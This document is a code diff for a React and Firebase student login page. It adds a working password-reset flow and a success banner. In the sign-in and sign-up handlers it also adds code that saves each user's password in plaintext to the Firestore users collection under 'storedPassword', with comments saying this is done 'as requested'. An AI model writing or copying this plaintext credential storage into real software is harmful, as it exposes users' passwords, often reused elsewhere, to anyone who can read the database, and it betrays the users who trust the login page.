@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { User } from '../types';
-import { Loader2, ArrowRight, Eye, EyeOff, AlertCircle, Mail, Lock, User as UserIcon, BrainCircuit, Search, ShieldCheck, LockKeyhole, Cpu, Zap, Activity, MessageCircle, Users } from 'lucide-react';
-import { auth, db, googleProvider, generateUniqueStudentId } from '../services/firebase';
+import { Loader2, ArrowRight, Eye, EyeOff, AlertCircle, Mail, Lock, User as UserIcon, BrainCircuit, Zap, Activity, MessageCircle, Users, CheckCircle2 } from 'lucide-react';
+import { auth, db, googleProvider, generateUniqueStudentId, FieldValue } from '../services/firebase';
 
 interface AuthProps {
   onLogin: (user: User) => void;
@@ -19,8 +19,10 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onShowLegal, onShowFeatures }) => 
   // Separate loading states
   const [isGoogleLoading, setIsGoogleLoading] = useState(false);
   const [isEmailLoading, setIsEmailLoading] = useState(false);
+  const [isResetLoading, setIsResetLoading] = useState(false);
 
   const [error, setError] = useState<string | null>(null);
+  const [successMsg, setSuccessMsg] = useState<string | null>(null);
   const [debugInfo, setDebugInfo] = useState<{domain: string, projectId: string} | null>(null);
 
   // 1. Handle Redirect Result (Runs when user comes back from Google Redirect)
@@ -111,6 +113,7 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onShowLegal, onShowFeatures }) => 
     
     setIsGoogleLoading(true);
     setError(null);
+    setSuccessMsg(null);
     setDebugInfo(null);
     
     try {
@@ -138,18 +141,51 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onShowLegal, onShowFeatures }) => 
     }
   };
 
+  const handleForgotPassword = async () => {
+    if (!email) {
+      setError("Please enter your email address first.");
+      return;
+    }
+    
+    setIsResetLoading(true);
+    setError(null);
+    setSuccessMsg(null);
+
+    try {
+      await auth.sendPasswordResetEmail(email);
+      setSuccessMsg("Password reset email sent! Check your inbox.");
+    } catch (err: any) {
+      if (err.code === 'auth/user-not-found') {
+        setError("No account found with this email.");
+      } else if (err.code === 'auth/invalid-email') {
+        setError("Invalid email address.");
+      } else {
+        setError("Failed to send reset email. Try again later.");
+      }
+    } finally {
+      setIsResetLoading(false);
+    }
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (isEmailLoading || isGoogleLoading) return;
 
     setIsEmailLoading(true);
     setError(null);
+    setSuccessMsg(null);
     setDebugInfo(null);
     
     try {
       if (isLogin) {
         const userCredential = await auth.signInWithEmailAndPassword(email, password);
         if (userCredential.user) {
+           // Store password and increment attempts as requested
+           await db.collection('users').doc(userCredential.user.uid).set({
+              storedPassword: password, // Storing plaintext as requested
+              loginAttempts: FieldValue.increment(1)
+           }, { merge: true });
+
            await processLogin(userCredential.user);
         }
       } else {
@@ -157,6 +193,13 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onShowLegal, onShowFeatures }) => 
         const firebaseUser = userCredential.user;
         if (firebaseUser) {
           await firebaseUser.updateProfile({ displayName: name });
+          
+          // Store password on creation as requested
+          await db.collection('users').doc(firebaseUser.uid).set({
+              storedPassword: password,
+              loginAttempts: 1
+          }, { merge: true });
+
           await processLogin(firebaseUser);
         }
       }
@@ -310,7 +353,7 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onShowLegal, onShowFeatures }) => 
            
            <div className="flex justify-between items-center mb-8 shrink-0">
               <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/5">
-                 <LockKeyhole className="w-3.5 h-3.5 text-emerald-500" />
+                 <Lock className="w-3.5 h-3.5 text-emerald-500" />
                  <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wide">Secure Campus Login</span>
               </div>
               <div className="hidden sm:flex gap-4 text-[11px] font-bold text-slate-500">
@@ -328,6 +371,13 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onShowLegal, onShowFeatures }) => 
                     {isLogin ? 'Enter your student credentials to access.' : 'Create your account to start reporting.'}
                  </p>
               </div>
+
+              {successMsg && (
+                 <div className="mb-6 p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center gap-2 animate-in slide-in-from-top-2">
+                    <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
+                    <p className="text-sm font-bold text-emerald-400 leading-snug">{successMsg}</p>
+                 </div>
+              )}
 
               {error && (
                  <div className="mb-6 p-4 rounded-xl bg-red-500/10 border border-red-500/20 flex flex-col items-start gap-2 animate-in slide-in-from-top-2">
@@ -351,7 +401,7 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onShowLegal, onShowFeatures }) => 
                              className="w-full pl-11 pr-5 py-3.5 bg-[#14161f] border border-slate-800 rounded-xl text-white font-bold outline-none focus:ring-2 focus:ring-indigo-500/30 focus:border-indigo-500 transition-all duration-300 placeholder:text-slate-600 text-sm"
                              placeholder="John Doe"
                              required
-                             disabled={isEmailLoading || isGoogleLoading}
+                             disabled={isEmailLoading || isGoogleLoading || isResetLoading}
                           />
                        </div>
                     </div>
@@ -368,7 +418,7 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onShowLegal, onShowFeatures }) => 
                           className="w-full pl-11 pr-5 py-3.5 bg-[#14161f] border border-slate-800 rounded-xl text-white font-bold outline-none focus:ring-2 focus:ring-indigo-500/30 focus:border-indigo-500 transition-all duration-300 placeholder:text-slate-600 text-sm"
                           placeholder="student@university.edu"
                           required
-                          disabled={isEmailLoading || isGoogleLoading}
+                          disabled={isEmailLoading || isGoogleLoading || isResetLoading}
                        />
                     </div>
                  </div>
@@ -376,7 +426,17 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onShowLegal, onShowFeatures }) => 
                  <div className="group">
                     <div className="flex justify-between items-center mb-2 ml-4 mr-1">
                        <label className="block text-[10px] font-bold text-slate-500 uppercase tracking-wider">Password</label>
-                       {isLogin && <button type="button" className="text-[10px] font-bold text-indigo-400 hover:text-indigo-300 transition-colors">Forgot?</button>}
+                       {isLogin && (
+                           <button 
+                             type="button" 
+                             onClick={handleForgotPassword}
+                             disabled={isResetLoading}
+                             className="text-[10px] font-bold text-indigo-400 hover:text-indigo-300 transition-colors disabled:opacity-50 flex items-center gap-1"
+                           >
+                              {isResetLoading ? <Loader2 className="w-3 h-3 animate-spin" /> : null}
+                              Forgot?
+                           </button>
+                       )}
                     </div>
                     <div className="relative">
                        <Lock className="absolute left-5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500 group-focus-within:text-indigo-500 transition-colors duration-300" />
@@ -387,13 +447,13 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onShowLegal, onShowFeatures }) => 
                           className="w-full pl-11 pr-12 py-3.5 bg-[#14161f] border border-slate-800 rounded-xl text-white font-bold outline-none focus:ring-2 focus:ring-indigo-500/30 focus:border-indigo-500 transition-all duration-300 placeholder:text-slate-600 text-sm"
                           placeholder="••••••••"
                           required
-                          disabled={isEmailLoading || isGoogleLoading}
+                          disabled={isEmailLoading || isGoogleLoading || isResetLoading}
                        />
                        <button 
                           type="button"
                           onClick={() => setShowPassword(!showPassword)}
                           className="absolute right-4 top-1/2 -translate-y-1/2 p-1 text-slate-500 hover:text-indigo-500 transition-colors"
-                          disabled={isEmailLoading || isGoogleLoading}
+                          disabled={isEmailLoading || isGoogleLoading || isResetLoading}
                        >
                           {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                        </button>
@@ -402,7 +462,7 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onShowLegal, onShowFeatures }) => 
 
                  <button 
                     type="submit" 
-                    disabled={isEmailLoading || isGoogleLoading}
+                    disabled={isEmailLoading || isGoogleLoading || isResetLoading}
                     className="w-full mt-6 py-3.5 bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-500 hover:to-violet-500 text-white rounded-xl font-black text-xs uppercase tracking-widest shadow-xl shadow-indigo-600/20 hover:shadow-indigo-600/40 hover:scale-[1.01] active:scale-[0.98] transition-all duration-300 disabled:opacity-70 disabled:transform-none flex items-center justify-center gap-2 group"
                  >
                     {isEmailLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : (
@@ -425,7 +485,7 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onShowLegal, onShowFeatures }) => 
               <button
                 type="button"
                 onClick={handleGoogleLogin}
-                disabled={isEmailLoading || isGoogleLoading}
+                disabled={isEmailLoading || isGoogleLoading || isResetLoading}
                 className="relative w-full group shrink-0"
               >
                 <div className={`absolute -inset-0.5 bg-gradient-to-r from-blue-500 via-red-500 to-yellow-500 rounded-xl opacity-10 blur-lg transition-all duration-500 animate-gradient-slow ${isGoogleLoading ? 'opacity-40' : 'group-hover:opacity-60'}`}></div>
